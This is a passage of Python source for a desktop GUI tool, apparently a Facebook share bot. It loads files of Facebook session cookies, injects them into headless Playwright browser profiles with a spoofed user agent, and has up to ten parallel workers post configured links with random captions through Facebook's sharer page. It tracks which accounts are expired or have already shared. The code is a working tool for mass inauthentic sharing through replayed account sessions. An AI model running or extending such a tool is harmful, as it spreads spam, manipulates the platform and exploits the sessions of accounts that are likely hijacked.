                           corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        card.pack(fill="x", pady=(0, 20))
        title_frame = ctk.CTkFrame(card, fg_color="transparent")
        title_frame.pack(fill="x", padx=30, pady=(25, 20))
        accent = ctk.CTkFrame(title_frame, fg_color=COLORS["primary"], width=5, height=24, corner_radius=3)
        accent.pack(side="left", padx=(0, 12))
        ctk.CTkLabel(title_frame, text=title, font=("Segoe UI", 16, "bold"),
                    text_color=COLORS["text_main"]).pack(side="left")
        return card
    def _create_feature_item(self, parent, icon, title, description):
        """Helper to create a feature item"""
        item_frame = ctk.CTkFrame(parent, fg_color=COLORS["bg_card"], 
                                 corner_radius=12, border_width=1, border_color=COLORS["border"])
        item_frame.pack(fill="x", pady=6)
        item_content = ctk.CTkFrame(item_frame, fg_color="transparent")
        item_content.pack(fill="x", padx=20, pady=15)
        icon_bg = ctk.CTkFrame(item_content, fg_color=COLORS["primary_bg"], 
                              corner_radius=10, width=40, height=40,
                              border_width=1, border_color=COLORS["primary"])
        icon_bg.pack(side="left", padx=(0, 15))
        icon_bg.pack_propagate(False)
        ctk.CTkLabel(icon_bg, text=icon, font=("Segoe UI Emoji", 18)).pack(expand=True)
        text_frame = ctk.CTkFrame(item_content, fg_color="transparent")
        text_frame.pack(side="left", fill="x", expand=True)
        ctk.CTkLabel(text_frame, text=title, font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"], anchor="w").pack(anchor="w")
        ctk.CTkLabel(text_frame, text=description, font=("Segoe UI", 10),
                    text_color=COLORS["text_sub"], anchor="w", wraplength=550).pack(anchor="w")
    def _create_step_item(self, parent, number, title, description):
        """Helper to create a step item"""
        item_frame = ctk.CTkFrame(parent, fg_color=COLORS["bg_card"], 
                                 corner_radius=12, border_width=1, border_color=COLORS["border"])
        item_frame.pack(fill="x", pady=6)
        item_content = ctk.CTkFrame(item_frame, fg_color="transparent")
        item_content.pack(fill="x", padx=20, pady=15)
        num_bg = ctk.CTkFrame(item_content, fg_color=COLORS["primary"], 
                             corner_radius=10, width=40, height=40)
        num_bg.pack(side="left", padx=(0, 15))
        num_bg.pack_propagate(False)
        ctk.CTkLabel(num_bg, text=number, font=("Segoe UI", 18, "bold"),
                    text_color=COLORS["text_main"]).pack(expand=True)
        text_frame = ctk.CTkFrame(item_content, fg_color="transparent")
        text_frame.pack(side="left", fill="x", expand=True)
        ctk.CTkLabel(text_frame, text=title, font=("Segoe UI", 12, "bold"),
                    text_color=COLORS["text_main"], anchor="w").pack(anchor="w")
        ctk.CTkLabel(text_frame, text=description, font=("Segoe UI", 10),
                    text_color=COLORS["text_sub"], anchor="w", wraplength=550).pack(anchor="w")
    def _create_tab_info_item(self, parent, tab_name, icon, description):
        """Helper to create a tab info item"""
        item_frame = ctk.CTkFrame(parent, fg_color=COLORS["bg_card"], 
                                 corner_radius=12, border_width=1, border_color=COLORS["border"])
        item_frame.pack(fill="x", pady=6)
        item_content = ctk.CTkFrame(item_frame, fg_color="transparent")
        item_content.pack(fill="x", padx=20, pady=15)
        icon_label = ctk.CTkLabel(item_content, text=icon, font=("Segoe UI Emoji", 24))
        icon_label.pack(side="left", padx=(0, 15))
        text_frame = ctk.CTkFrame(item_content, fg_color="transparent")
        text_frame.pack(side="left", fill="x", expand=True)
        ctk.CTkLabel(text_frame, text=tab_name, font=("Segoe UI", 13, "bold"),
                    text_color=COLORS["primary"], anchor="w").pack(anchor="w")
        ctk.CTkLabel(text_frame, text=description, font=("Segoe UI", 10),
                    text_color=COLORS["text_sub"], anchor="w", wraplength=600).pack(anchor="w", pady=(3, 0))
    def on_close(self):
        self.stop_automation()
        try:
            if os.name == 'nt':
                creationflags = subprocess.CREATE_NO_WINDOW
                subprocess.run(["taskkill", "/f", "/im", "gnirehtet.exe"], creationflags=creationflags,
                               capture_output=True)
        except:
            pass
        self.destroy()
        os._exit(0)
    def _count_and_update_cookies(self, file_path):
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    ac = [l.strip() for l in f if l.strip()]
                self.update_total_cookies_ui(len(ac))
            except Exception as e:
                self.update_total_cookies_ui(0)
        else:
            self.update_total_cookies_ui(0)
    def browse_global_cookie(self):
        f = filedialog.askopenfilename(filetypes=[("Txt", "*.txt")])
        if f:
            self.cookie_entry.delete(0, "end")
            self.cookie_entry.insert(0, f)
            self.global_cookie_path = f
            self._count_and_update_cookies(f)
    def load_settings(self):
        try:
            with open("pc_settings.json", "r") as f:
                d = json.load(f)
                self.global_cookie_path = d.get("global_cookie_path", "")
                self.fast_mode_var.set(d.get("fast_mode", True))
                if hasattr(self, 'close_browser_var'):
                    self.close_browser_var.set(d.get("close_browser_after_shares", False))
                if hasattr(self, 'headless_var'):
                    self.headless_var.set(d.get("headless_mode", True))
                if hasattr(self, 'auto_click_share_var'):
                    self.auto_click_share_var.set(d.get("auto_click_share", True))
                if hasattr(self, 'keep_browser_on_error_var'):
                    self.keep_browser_on_error_var.set(d.get("keep_browser_on_error", False))
                if hasattr(self, 'max_workers_entry'):
                    max_workers = d.get("max_workers", 10)
                    self.max_workers_entry.delete(0, "end")
                    self.max_workers_entry.insert(0, str(max_workers))
                self.after(500, lambda: self._set_vals(d))
        except Exception as e:
            pass
    def _set_vals(self, d):
        try:
            self.dash_pre_delay.delete(0, "end")
            self.dash_pre_delay.insert(0, d.get("dash_pre_delay", "10"))
            self.dash_post_delay.delete(0, "end")
            self.dash_post_delay.insert(0, d.get("dash_post_delay", "10"))
            cookie_path = d.get("global_cookie_path", "")
            if hasattr(self, 'cookie_entry'):
                self.cookie_entry.delete(0, "end")
                self.cookie_entry.insert(0, cookie_path)
            self._count_and_update_cookies(cookie_path)
            if hasattr(self, 'server_folder_entry') and d.get("server_folder_path"):
                self.server_folder_entry.insert(0, d.get("server_folder_path", ""))
            saved_kiwis = d.get("kiwi_packages", [])
            if hasattr(self, 'kiwi_entries_container'):
                for widget in self.kiwi_entries_container.winfo_children():
                    widget.destroy()
                self.kiwi_entries.clear()
                if saved_kiwis:
                    for pkg in saved_kiwis:
                        self.add_kiwi_entry(pkg)
                else:
                    default_kiwis = [
                        "com.kiwibrowser.browser",
                        "com.kiwibrowser.browses",
                        "com.kiwibrowser.browset",
                        "com.kiwibrowser.browseu",
                        "com.kiwibrowser.browsev"
                    ]
                    for pkg in default_kiwis:
                        self.add_kiwi_entry(pkg)
            if hasattr(self, 'kiwi_delay_entry') and "kiwi_delay" in d:
                self.kiwi_delay_entry.delete(0, "end")
                self.kiwi_delay_entry.insert(0, d.get("kiwi_delay", "8"))
        except Exception as e:
            pass
    def save_config(self):
        self.global_cookie_path = self.cookie_entry.get()
        server_path = self.server_folder_entry.get() if hasattr(self, 'server_folder_entry') else ""
        kiwi_pkgs = [entry.get().strip() for entry in self.kiwi_entries] if hasattr(self, 'kiwi_entries') else []
        kiwi_delay = self.kiwi_delay_entry.get() if hasattr(self, 'kiwi_delay_entry') else "8"
        close_browser = self.close_browser_var.get() if hasattr(self, 'close_browser_var') else False
        headless = self.headless_var.get() if hasattr(self, 'headless_var') else True
        auto_click = self.auto_click_share_var.get() if hasattr(self, 'auto_click_share_var') else True
        keep_on_error = self.keep_browser_on_error_var.get() if hasattr(self, 'keep_browser_on_error_var') else False
        max_workers = 10
        if hasattr(self, 'max_workers_entry'):
            try:
                max_workers = int(self.max_workers_entry.get())
                if max_workers < 1:
                    max_workers = 1
                elif max_workers > 10:
                    max_workers = 10
            except:
                max_workers = 10
        self.saved_settings = {
            "global_cookie_path": self.global_cookie_path,
            "server_folder_path": server_path,
            "dash_pre_delay": self.dash_pre_delay.get(),
            "dash_post_delay": self.dash_post_delay.get(),
            "fast_mode": self.fast_mode_var.get(),
            "kiwi_packages": kiwi_pkgs,
            "kiwi_delay": kiwi_delay,
            "close_browser_after_shares": close_browser,
            "headless_mode": headless,
            "auto_click_share": auto_click,
            "keep_browser_on_error": keep_on_error,
            "max_workers": max_workers
        }
        with open("pc_settings.json", "w") as f:
            json.dump(self.saved_settings, f, indent=2)
        messagebox.showinfo("Saved", "Configuration updated.")
    def add_pair(self):
        pair_num = len(self.pair_widgets) + 1
        new_pair = PairFrame(self.pairs_scroll, pair_num, lambda: self.remove_pair(new_pair))
        new_pair.pack(fill="x", padx=5, pady=8)
        self.pair_widgets.append(new_pair)
    def remove_pair(self, frame):
        if len(self.pair_widgets) > 1:
            frame.destroy()
            self.pair_widgets.remove(frame)
            for i, f in enumerate(self.pair_widgets):
                f.header_label.configure(text=f"📍 LINK #{i + 1}")
    def parse_playwright_cookies(self, cookie_str):
        cookies = []
        expires_time = int(time.time()) + (365 * 24 * 60 * 60)
        for pair in cookie_str.split(";"):
            if "=" in pair:
                name, value = pair.strip().split("=", 1)
                cookies.append({
                    "name": name,
                    "value": value,
                    "domain": ".facebook.com",
                    "path": "/",
                    "expires": expires_time
                })
        return cookies
    def update_active_threads_ui(self, count):
        self.overall_stats.update_devices(count)
        if hasattr(self, 'log_threads_label'):
            self.log_threads_label.configure(text=f"💻 ACTIVE THREADS: {count}")
    def update_total_cookies_ui(self, count):
        self.overall_stats.update_cookies(count)
        if hasattr(self, 'log_cookies_label'):
            self.log_cookies_label.configure(text=f"🍪 COOKIES: {count}")
    def _mark_account_done(self):
        try:
            self.cookie_queue.task_done()
        except:
            pass
        with self.progress_lock:
            self.accounts_processed += 1
            c = self.accounts_processed
            t = self.total_accounts_to_process
        self.after(0, lambda: self.update_progress_ui(c, t))
    def run_pc_automation(self, worker_id):
        self.log_row(worker_id, "---", "---", "🚀 STARTED", "INFO")
        try:
            pre_wait = float(self.dash_pre_delay.get())
        except Exception as e:
            pre_wait = 5.0
        is_fast_mode = self.fast_mode_var.get()
        limit = 0
        processed = 0
        with sync_playwright() as p:
            while self.is_running:
                if limit > 0 and processed >= limit:
                    self.log_row(worker_id, "---", "---", "⛔ LIMIT REACHED", "WARN")
                    break
                try:
                    data = self.cookie_queue.get(timeout=2)
                    cookie_str = data['cookie']
                    acc_idx = data['index']
                except queue.Empty:
                    if self.cookie_queue.empty():
                        break
                    continue
                is_saved_profile = cookie_str.startswith("saved_profile:")
                if is_saved_profile:
                    acc_id = cookie_str.replace("saved_profile:", "")
                    self.log_row(worker_id, "---", "---", f"USING SAVED PROFILE {acc_id[:8]}... (Acc {acc_idx})", "INFO")
                else:
                    acc_id = self.get_account_id(cookie_str)
                pending_jobs = []
                for link, cap_file in self.job_list_global:
                    if link in self.share_history and acc_id in self.share_history[link]:
                        self.log_row(worker_id, link, "---", f"SKIPPED (ALREADY SHARED) Acc {acc_idx}", "WARN")
                    else:
                        pending_jobs.append((link, cap_file))
                if not pending_jobs:
                    self._mark_account_done()
                    continue
                processed += 1
                context = None
                link_idx = 0
                total_links = len(pending_jobs)
                profile_dir = os.path.join(os.getcwd(), "profiles", acc_id)
                delete_profile_flag = False
                success_count = 0
                was_already_saved = False
                error_occurred_in_account = False  # Track errors for this account
                try:
                    while link_idx < total_links and self.is_running:
                        ln = link_idx + 1
                        link, cap_file = pending_jobs[link_idx]
                        sel_cap = "---"
                        try:
                            if context is None:
                                browser_args = [
                                    "--blink-settings=imagesEnabled=false,videoAutoplayEnabled=false",
                                    "--disable-notifications",
                                    "--no-sandbox",
                                    "--mute-audio",
                                    "--disable-popup-blocking",
                                    "--disable-infobars",
                                    "--disable-dev-shm-usage",
                                    "--disable-extensions",
                                    "--ignore-certificate-errors",
                                    "--renderer-process-limit=1",
                                    "--single-process",
                                    "--disable-background-networking",
                                    "--disable-sync",
                                    "--disable-translate",
                                    "--disk-cache-size=1",
                                    "--media-cache-size=1"
                                ]
                                os.makedirs(profile_dir, exist_ok=True)
                                use_headless = True
                                if hasattr(self, 'headless_var'):
                                    use_headless = self.headless_var.get()
                                context = p.chromium.launch_persistent_context(
                                    user_data_dir=profile_dir,
                                    headless=use_headless,
                                    args=browser_args,
                                    viewport={'width': 360, 'height': 640},
                                    user_agent="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
                                )
                                self.active_browsers.append(context)
                                current_cookies = context.cookies("https://www.facebook.com")
                                is_logged_in = len(current_cookies) > 0
                                was_already_saved = is_logged_in
                                if not is_logged_in:
                                    if not is_saved_profile:
                                        cookies = self.parse_playwright_cookies(cookie_str)
                                        if cookies:
                                            context.add_cookies(cookies)
                                        self.log_row(worker_id, "---", "---", f"INJECTED COOKIE (Acc {acc_idx})", "INFO")
                                    else:
                                        self.log_row(worker_id, "---", "---", 
                                                   f"ERROR: Saved profile has no session (Acc {acc_idx})", "ERROR")
                                        delete_profile_flag = True
                                        break
                                else:
                                    self.log_row(worker_id, "---", "---", f"USING SAVED SESSION (Acc {acc_idx})",
                                                 "SUCCESS")
                                page = context.pages[0] if context.pages else context.new_page()
                                client = context.new_cdp_session(page)
                                client.send("Network.setUserAgentOverride", {
                                    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                    "platform": "Win32",
                                    "acceptLanguage": "en-US,en;q=0.9"
                                })
                                if is_fast_mode:
                                    blocked_urls = ["*.jpg", "*.jpeg", "*.png", "*.gif", "*.css", "*.mp4", "*.avi",
                                                    "*.woff", "*.woff2", "*.ttf", "*.ico", "*favicon*"]
                                    client.send("Network.enable")
                                    client.send("Network.setBlockedURLs", {"urls": blocked_urls})
                            else:
                                page = context.pages[0] if context.pages else context.new_page()
                            page.goto(f"https://www.facebook.com/sharer/sharer.php?u={link}", timeout=90 * 1000)
                            dialog_selectors = (
                                "div[aria-label='Close composer dialog'], "
                                "div[aria-label='Close composer dialogue'], "
                                "div[aria-label*='Close composer'], "
                                "div[role='button'][aria-label*='Close']"
                            )
                            dialog_locator = page.locator(dialog_selectors).first
                            try:
                                page.wait_for_selector(
                                    f"{dialog_selectors}, button[type='submit'], input[type='submit']", state="visible",
                                    timeout=30000)
                            except PlaywrightTimeoutError:
                                fb_profile_link = f"https://www.facebook.com/{acc_id}"
                                with self.stats_lock:
                                    if acc_id not in self.expired_accounts:
                                        self.expired_accounts.add(acc_id)
                                        self.expired_count += 1
                                        self.log_row(worker_id, fb_profile_link, "---",
                                                     f"COOKIE EXPIRED Account {acc_idx}", "ERROR")
                                        self.after(0, lambda link=fb_profile_link: self.add_expired_to_tree(link))
                                    else:
                                        self.log_row(worker_id, fb_profile_link, "---",
                                                     f"SKIPPED (ALREADY EXPIRED) Acc {acc_idx}", "WARN")
                                    self.error_count += 1
                                    self.total_attempts += 1
                                delete_profile_flag = True
                                self.update_stats()
                                break
                            if cap_file and os.path.exists(cap_file):
                                try:
                                    with open(cap_file, "r", encoding="utf-8") as f:
                                        lines = [x.strip() for x in f if x.strip()]
                                    if lines:
                                        sel_cap = random.choice(lines)
                                        page.keyboard.type(sel_cap)
                                        time.sleep(pre_wait)
                                except:
                                    pass
                            should_auto_click = True
                            if hasattr(self, 'auto_click_share_var'):
                                should_auto_click = self.auto_click_share_var.get()
                            if should_auto_click:
                                post_btn = page.locator(
                                    "button[type='submit'], input[type='submit'], button[name='share'], button[value='Share'], [aria-label='Share'], button:has-text('Share'), button:has-text('Next')").first
                                try:
                                    post_btn.wait_for(state="visible", timeout=15000)
                                    post_btn.click()
                                except PlaywrightTimeoutError:
                                    page.evaluate(
                                        "let btn = document.querySelector('button[type=\"submit\"], input[type=\"submit\"]'); if(btn) btn.click();")
                            is_dialog_closed = False
                            try:
                                dialog_locator.wait_for(state="hidden", timeout=20000)
                                is_dialog_closed = True
                            except PlaywrightTimeoutError:
                                try:
                                    if not page.locator(
                                            "button[type='submit'], input[type='submit']").first.is_visible():
                                        is_dialog_closed = True
                                except:
                                    pass
                            if is_dialog_closed:
                                with self.history_lock:
                                    if link not in self.share_history:
                                        self.share_history[link] = []
                                    if acc_id not in self.share_history[link]:
                                        self.share_history[link].append(acc_id)
                                self.save_share_history()
                                self.log_row(worker_id, link, sel_cap, f"SUCCESS LINK {ln} Account {acc_idx}",
                                             "SUCCESS")
                                with self.stats_lock:
                                    success_count += 1
                                    self.total_shares += 1
                                    self.total_attempts += 1
                                self.update_stats()
                            else:
                                self.log_row(worker_id, link, sel_cap, f"FAILED TO SHARE (Button/Block) Acc {acc_idx}",
                                             "ERROR")
                                with self.stats_lock:
                                    self.error_count += 1
                                    self.total_attempts += 1
                                self.update_stats()
                            time.sleep(2)
                        except Exception as e:
                            err_str = str(e).replace('\n', ' ')
                            self.log_row(worker_id, link, sel_cap, f"ERR: {err_str[:40]}", "ERROR")
                            with self.stats_lock:
                                self.error_count += 1
                                self.total_attempts += 1
                            self.update_stats()
                            error_occurred_in_account = True  # Mark error for this account
                        link_idx += 1
                except Exception as e:
                    self.log_row(worker_id, "---", "---", f"FATAL WORKER ERR: {str(e)[:30]}", "ERROR")
                    with self.stats_lock:
                        self.error_count += 1
                        self.total_attempts += 1
                    self.update_stats()
                    error_occurred_in_account = True  # Mark fatal error for this account
                finally:
                    if context:
                        try:
                            keep_on_error = False
                            if hasattr(self, 'keep_browser_on_error_var'):
                                keep_on_error = self.keep_browser_on_error_var.get()
                            should_close = False  # Default: Keep browser open for debugging
                            if hasattr(self, 'close_browser_var'):
                                should_close = self.close_browser_var.get()
                            if error_occurred_in_account and keep_on_error:
                                if context in self.active_browsers:
                                    self.active_browsers.remove(context)
                                self.log_row(worker_id, "---", "---", "BROWSER KEPT OPEN (Error Debug Mode)", "WARN")
                            elif should_close:
                                if context in self.active_browsers:
                                    self.active_browsers.remove(context)
                                context.close()
                            else:
                                if context in self.active_browsers:
                                    self.active_browsers.remove(context)
                                self.log_row(worker_id, "---", "---", "BROWSER KEPT OPEN (Debug Mode)", "INFO")
                        except:
                            pass
                    if delete_profile_flag or (not was_already_saved and success_count == 0):
                        for _ in range(3):
                            try:
                                time.sleep(1.5)
                                if os.path.exists(profile_dir):
                                    shutil.rmtree(profile_dir, ignore_errors=True)
                                if not os.path.exists(profile_dir):
                                    break
                            except Exception:
                                pass
                    self._mark_account_done()
        self.active_worker_count -= 1
        self.after(0, lambda: self.update_active_threads_ui(self.active_worker_count))
    def update_stats(self):
        self.after(0, lambda: self.overall_stats.update_stats(self.total_shares, self.error_count))
        if hasattr(self, 'log_shares_label'):
            self.after(0, lambda: self.log_shares_label.configure(text=f"✅ SHARES: {self.total_shares}"))
        if hasattr(self, 'log_failed_label'):
            self.after(0, lambda: self.log_failed_label.configure(text=f"⚠️ FAILED: {self.error_count}"))
        if hasattr(self, 'log_expired_label'):
            self.after(0, lambda: self.log_expired_label.configure(text=f"❌ EXPIRED: {self.expired_count}"))
    def start_threads(self):
        self.job_list_global = [(p.link_entry.get(), p.caption_path.get()) for p in self.pair_widgets if
                                p.link_entry.get().strip()]
        if not self.job_list_global:
            messagebox.showerror("Error", "No links configured!")
            return
        use_saved_profiles = self.use_saved_profiles_var.get()
        if use_saved_profiles:
            profiles_dir = os.path.join(os.getcwd(), "profiles")
            if not os.path.exists(profiles_dir):
                messagebox.showerror("Error", "No saved profiles found!\n\nPlease run automation with cookies first to create saved profiles.")
                return
            profile_uids = [d for d in os.listdir(profiles_dir) if os.path.isdir(os.path.join(profiles_dir, d))]
            if not profile_uids:
                messagebox.showerror("Error", "No saved profiles found!\n\nPlease run automation with cookies first to create saved profiles.")
                return
            ac = [f"saved_profile:{uid}" for uid in profile_uids]
            self.update_total_cookies_ui(len(ac))
            self.total_accounts_to_process = len(ac)
            self.accounts_processed = 0
            self.update_progress_ui(0, self.total_accounts_to_process)
            messagebox.showinfo("Saved Profiles Mode", 
                              f"Starting automation with {len(ac)} saved profiles!\n\nThese accounts will use their saved sessions.")
        else:
            if not os.path.exists(self.cookie_entry.get()):
                messagebox.showerror("Error", "Invalid Cookie File Path!")
                return
            try:
                with open(self.cookie_entry.get(), "r", encoding="utf-8") as f:
                    ac = [l.strip() for l in f if l.strip()]
                if not ac:
                    raise Exception("Cookie list is empty")
                self.update_total_cookies_ui(len(ac))
                self.total_accounts_to_process = len(ac)
                self.accounts_processed = 0
                self.update_progress_ui(0, self.total_accounts_to_process)
            except Exception as e:
                traceback.print_exc()
                messagebox.showerror("Error", "Cookie file is empty or cannot be read!")
                return
        self._launch_workers(ac)
    def _launch_workers(self, ac):
        num_accounts = len(ac)
        max_threads_cap = 10
        if hasattr(self, 'max_workers_entry'):
            try:
                max_threads_cap = int(self.max_workers_entry.get())
                if max_threads_cap < 1:
                    max_threads_cap = 1
                elif max_threads_cap > 10:
                    max_threads_cap = 10
            except:
                max_threads_cap = 10
        num_threads = min(num_accounts, max_threads_cap)
        if num_threads < 1:
            num_threads = 1
        with self.cookie_queue.mutex:
            self.cookie_queue.queue.clear()
        for i, c in enumerate(ac):
            self.cookie_queue.put({'cookie': c, 'index': i + 1})
        self.is_running = True
        self.status_badge.configure(text="● RUNNING", text_color=COLORS["success"])
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        try:
            self.logs_stop_btn.configure(state="normal")
        except:
            pass
        self.tabview.set("   System Logs   ")
        self.worker_threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.run_pc_automation, args=(f"Worker-{i + 1}",))
            t.start()
            self.worker_threads.append(t)
            self.active_worker_count += 1
            self.update_active_threads_ui(self.active_worker_count)
        def monitor():
            while self.is_running:
                alive = [t for t in self.worker_threads if t.is_alive()]
                if not alive:
                    break
                time.sleep(1)
            self.is_running = False
            self.after(0, lambda: self.status_badge.configure(text="● FINISHED", text_color=COLORS["text_sub"]))
            self.after(0, lambda: self.start_btn.configure(state="normal"))
            self.after(0, lambda: self.stop_btn.configure(state="disabled"))
            self.after(0, self.populate_saved_profiles)
        threading.Thread(target=monitor, daemon=True).start()
    def stop_automation(self):
        self.is_running = False
        self.stop_btn.configure(state="disabled")
        self.status_badge.configure(text="● STOPPING...", text_color=COLORS["warning"])
        with self.cookie_queue.mutex:
            self.cookie_queue.queue.clear()
        def kill():
            for b in list(self.active_browsers):
                try:
                    b.close()
                except Exception as e:
                    pass
            self.active_browsers = []
            self.after(0, lambda: messagebox.showinfo("Stopped", "Automation Force Stopped."))
            self.after(0, self.populate_saved_profiles)
        threading.Thread(target=kill, daemon=True).start()
if __name__ == "__main__":
    app = FacebookAutomationGUI()
    app.mainloop()
